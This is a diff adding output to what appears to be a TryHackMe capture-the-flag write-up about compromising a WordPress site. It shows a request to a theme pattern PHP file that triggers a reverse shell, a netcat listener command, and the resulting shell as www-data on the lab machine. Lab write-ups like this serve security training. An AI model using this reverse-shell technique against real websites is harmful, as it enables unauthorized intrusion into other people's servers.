@@ -1226,3 +1226,15 @@ This allows access to the /wp-admin portal
 http://TargetIP/wp-content/themes/twentytwentyfive/patterns/contact-info-locations.php
 ```
 This automatically connects to reverse shell.
+```
+root@ip-10-64-82-12:~# nc -lvnp 4445
+Listening on 0.0.0.0 4445
+Connection received on 10.64.155.4 35208
+Linux tryhackme-2404 7.0.0-1010-aws #10~24.04.1-Ubuntu SMP PREEMPT Mon Jul 27 17:41:33 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+ 12:22:06 up  1:57,  0 user,  load average: 0.01, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
